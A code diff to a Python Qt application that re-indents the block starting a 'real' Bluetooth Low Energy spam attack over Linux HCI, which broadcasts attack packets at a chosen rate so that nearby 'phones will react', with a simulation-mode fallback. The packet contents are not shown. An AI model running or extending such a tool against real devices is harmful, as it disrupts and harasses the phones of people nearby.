@@ -738,45 +738,42 @@ class MainWindow(QMainWindow):
                 )
                 
                 if use_real_tx:
-
-                # Real Linux transmission
-                start_btn.setEnabled(False)
-                stop_btn.setEnabled(True)
-                status_label.setText(" REAL TRANSMISSION ACTIVE - Phones will react!")
-                
-                def run_linux_spam():
-                    nonlocal linux_tx
-                    loop = asyncio.new_event_loop()
-                    asyncio.set_event_loop(loop)
+                    # Real Linux transmission
+                    start_btn.setEnabled(False)
+                    stop_btn.setEnabled(True)
+                    status_label.setText(" REAL TRANSMISSION ACTIVE - Phones will react!")
                     
-                    linux_tx = LinuxBluetoothTransmitter()
-
+                    def run_linux_spam():
+                        nonlocal linux_tx
+                        loop = asyncio.new_event_loop()
+                        asyncio.set_event_loop(loop)
+                        
+                        linux_tx = LinuxBluetoothTransmitter()
+                        
+                        async def spam():
+                            if await linux_tx.initialize():
+                                packets = BLESpamAttack.get_all_attack_packets()
+                                await linux_tx.spam_advertisements(
+                                    packets, 
+                                    interval=1.0 / rate_spin.value()
+                                )
+                        
+                        try:
+                            loop.run_until_complete(spam())
+                        except Exception as e:
+                            logger.error(f"Linux spam error: {e}")
+                        finally:
+                            if linux_tx:
+                                linux_tx.close()
                     
-                    async def spam():
-                        if await linux_tx.initialize():
-                            packets = BLESpamAttack.get_all_attack_packets()
-                            await linux_tx.spam_advertisements(
-                                packets, 
-                                interval=1.0 / rate_spin.value()
-                            )
+                    spam_thread = threading.Thread(target=run_linux_spam, daemon=True)
+                    spam_thread.start()
                     
-                    try:
-                        loop.run_until_complete(spam())
-                    except Exception as e:
-                        logger.error(f"Linux spam error: {e}")
-                    finally:
-                        if linux_tx:
-                            linux_tx.close()
+                    logger.info("Started REAL Bluetooth spam via Linux HCI")
+                    return
                 
-                spam_thread = threading.Thread(target=run_linux_spam, daemon=True)
-                spam_thread.start()
-                
-                logger.info("Started REAL Bluetooth spam via Linux HCI")
-                return
-            
-            # Simulation mode (default or fallback)
+                # Simulation mode (default or fallback)
 
-                # Simulation mode
                 mode_map = {
                     0: SpamMode.ADVERTISING,
                     1: SpamMode.CONNECTION,
